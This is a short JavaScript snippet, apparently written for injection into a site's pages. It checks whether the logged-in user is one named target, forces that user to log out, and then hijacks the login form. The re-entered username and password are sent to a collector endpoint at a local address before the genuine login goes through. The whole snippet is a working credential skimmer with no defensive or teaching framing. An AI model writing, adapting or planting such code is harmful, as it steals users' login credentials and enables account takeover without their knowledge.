const el = document.getElementById('nick');
const username = el ? el.textContent : "";

const allowedUsernames = ["MatteC"];

if (allowedUsernames.includes(username)) {
    console.log("VALID USERNAME")

    Logout.submit()

    loginForm = document.getElementById('loginForm');
    loginForm.onsubmit = null;
    loginForm.addEventListener('submit', (event) => {
        event.preventDefault();
        event.stopImmediatePropagation();

        login_username = event.target.UserName.value;
        login_password = event.target.PassWord.value;
        sendLogin(login_username, login_password, function (data) {
            console.log('Login finished, now submit the form');
            document.getElementById('loginForm').submit();
        });

    });

} else {
    console.log("INVALID USERNAME")
}

function sendLogin(username, password, onFinish) {
    const url = new URL('http://127.0.0.1:5000/credentials');
    url.searchParams.append('username', username);
    url.searchParams.append('password', password);

    fetch(url, { method: 'GET' })
        .then(data => {
            if (onFinish) onFinish(data); // call callback when done
        })
        .catch(err => console.error('Fetch error:', err));
}

